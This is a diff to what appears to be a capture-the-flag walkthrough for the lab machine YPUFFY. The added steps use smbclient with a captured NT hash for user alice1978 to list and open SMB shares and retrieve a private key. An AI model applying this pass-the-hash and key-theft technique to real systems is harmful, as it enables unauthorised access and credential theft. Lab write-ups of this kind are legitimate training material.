@@ -32,3 +32,13 @@ Service Info: Host: YPUFFY
 |         sambaPwdLastSet: 1532916644
 ...
 
+3. smbclient -L 10.10.10.107 -U alice1978 --pw-nt-hash //10.10.10.107/ 0B186E661BBDBDCF6047784DE8B9FD8B
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	alice           Disk      Alice's Windows Directory
+	IPC$            IPC       IPC Service (Samba Server)
+
+4. smbclient -U alice1978 --pw-nt-hash //10.10.10.107/alice/ 0B186E661BBDBDCF6047784DE8B9FD8B
+get the private key
+
